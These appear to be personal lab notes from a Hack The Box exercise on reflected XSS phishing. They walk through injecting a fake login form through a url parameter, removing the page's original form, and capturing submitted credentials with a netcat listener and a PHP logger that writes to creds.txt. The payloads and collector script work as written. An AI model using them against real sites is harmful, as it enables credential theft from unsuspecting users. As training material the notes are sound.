## XSS Discovery

`http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg`
![](Pasted%20image%2020260627141458.png)

`http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>`
![](Pasted%20image%2020260627141513.png)
## Login Form Injection

```html
<h3>Please login to continue</h3> 
<form action=http://OUR_IP> 
	<input type="username" name="username" placeholder="Username"> 
	<input type="password" name="password" placeholder="Password"> 
	<input type="submit" name="submit" value="Login"> 
</form>
```

```html
<div> 
<h3>Please login to continue</h3> 
<input type="text" placeholder="Username"> 
<input type="text" placeholder="Password"> 
<input type="submit" value="Login"> 
<br><br> 
</div>
```

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
![](Pasted%20image%2020260627141842.png)
## Cleaning Up
![](Pasted%20image%2020260627141953.png)

As we see in both the source code and the hover text the `url` form has the id `urlform`:

```html
<form role="form" action="index.php" method="GET" id='urlform'> <input type="text" placeholder="Image URL" name="url"> </form>
```

So, we can now use this id with the `remove()` function to remove the URL form:

```javascript
document.getElementById('urlform').remove();
```

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```
![](Pasted%20image%2020260627142116.png)
## Credential Stealing

```shell
3kjS@htb[/htb]$ sudo nc -lvnp 80 
listening on [any] 80 ...
```

Now, let's attempt to login with the credentials `test:test`, and check the `netcat` output we get

```shell
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX 
GET /?username=test&password=test&submit=Login HTTP/1.1 
Host: 10.10.XX.XX 
...SNIP...
```

```php
<?php if (isset($_GET['username']) && isset($_GET['password'])) { $file = fopen("creds.txt", "a+"); fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); header("Location: http://SERVER_IP/phishing/index.php"); fclose($file); exit(); } ?>
```

```shell
3kjS@htb[/htb]$ mkdir /tmp/tmpserver 
3kjS@htb[/htb]$ cd /tmp/tmpserver 
3kjS@htb[/htb]$ vi index.php #at this step we wrote our index.php file 
3kjS@htb[/htb]$ sudo php -S 0.0.0.0:80 
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Let's try logging into the injected login form and see what we get. We see that we get redirected to the original Image Viewer page:
![](Pasted%20image%2020260627142439.png)

```shell
3kjS@htb[/htb]$ cat creds.txt 
Username: test | Password: test
```
